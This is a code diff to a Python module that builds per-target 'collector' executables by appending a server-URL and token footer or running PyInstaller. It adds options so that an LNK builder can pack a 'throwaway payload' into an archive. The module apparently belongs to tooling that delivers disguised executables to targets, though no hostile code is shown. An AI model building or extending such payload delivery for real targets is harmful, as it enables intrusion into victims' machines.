@@ -96,17 +96,27 @@ def get_all_build_status():
         return dict(_build_status)
 
 
-def build_exe(server_url, token, target_name, exe_filename=''):
+def build_exe(server_url, token, target_name, exe_filename='',
+              output_dir=None, register=True):
     """Build a target-specific EXE. Uses fast footer injection if base EXE
-    exists; falls back to full PyInstaller build."""
+    exists; falls back to full PyInstaller build.
+
+    ``output_dir`` and ``register`` let callers (the LNK builder) produce a
+    throwaway payload that is packed into the archive without being published
+    as a downloadable EXE for the target.
+    """
     from .config_manager import load_config, resolve_exe_name
     config = load_config()
     exe_name = resolve_exe_name(target_name, token, exe_filename)
+    target_dir = output_dir or OUTPUT_DIR
 
     if os.path.exists(BASE_EXE_PATH):
-        return _build_with_footer(server_url, token, config, exe_name)
+        return _build_with_footer(server_url, token, config, exe_name,
+                                  output_dir=target_dir, register=register)
 
-    return _build_with_pyinstaller(server_url, token, target_name, config, exe_name)
+    return _build_with_pyinstaller(server_url, token, target_name, config,
+                                   exe_name, output_dir=target_dir,
+                                   register=register)
 
 
 def build_base_exe(icon_path=None, output_name='collector_base'):
@@ -165,7 +175,8 @@ def build_all_base_exes():
     return results
 
 
-def _build_with_footer(server_url, token, config, exe_name):
+def _build_with_footer(server_url, token, config, exe_name,
+                       output_dir=None, register=True):
     """Copy a base EXE and append a JSON config footer.
 
     Prefers an icon-specific base EXE when the configured icon matches a
@@ -174,7 +185,8 @@ def _build_with_footer(server_url, token, config, exe_name):
     """
     from .config_manager import get_icon_path
 
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    output_dir = output_dir or OUTPUT_DIR
+    os.makedirs(output_dir, exist_ok=True)
 
     cfg = {
         'server_url': server_url,
@@ -198,7 +210,7 @@ def _build_with_footer(server_url, token, config, exe_name):
             if os.path.exists(candidate):
                 use_base = candidate
 
-    exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}.exe")
+    exe_path = os.path.join(output_dir, f"{exe_name}.exe")
     with open(use_base, 'rb') as src:
         with open(exe_path, 'wb') as dst:
             dst.write(src.read())
@@ -217,15 +229,18 @@ def _build_with_footer(server_url, token, config, exe_name):
     with open(exe_path, 'ab') as dst:
         dst.write(footer)
 
-    register_exe(token, os.path.basename(exe_path))
+    if register:
+        register_exe(token, os.path.basename(exe_path))
     return exe_path
 
 
-def _build_with_pyinstaller(server_url, token, target_name, config, exe_name):
+def _build_with_pyinstaller(server_url, token, target_name, config, exe_name,
+                            output_dir=None, register=True):
     """Full PyInstaller build (Windows or Linux native binary)."""
     from .config_manager import get_icon_path
 
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    output_dir = output_dir or OUTPUT_DIR
+    os.makedirs(output_dir, exist_ok=True)
     os.makedirs(BUILD_DIR, exist_ok=True)
 
     build_script = os.path.join(BUILD_DIR, f'collector_{token[:8]}.py')
@@ -250,7 +265,7 @@ def _build_with_pyinstaller(server_url, token, target_name, config, exe_name):
         sys.executable, '-m', 'PyInstaller',
         '--onefile',
         '--name', exe_name,
-        '--distpath', OUTPUT_DIR,
+        '--distpath', output_dir,
         '--workpath', os.path.join(BUILD_DIR, 'pyi_work'),
         '--specpath', BUILD_DIR,
     ]
@@ -271,11 +286,12 @@ def _build_with_pyinstaller(server_url, token, target_name, config, exe_name):
     if result.returncode != 0:
         raise RuntimeError(f"PyInstaller failed: {result.stderr}")
 
-    exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}{BIN_EXT}")
+    exe_path = os.path.join(output_dir, f"{exe_name}{BIN_EXT}")
     if not os.path.exists(exe_path):
         raise RuntimeError(f"Binary not found at expected path: {exe_path}")
 
-    register_exe(token, os.path.basename(exe_path))
+    if register:
+        register_exe(token, os.path.basename(exe_path))
     return exe_path
 
 
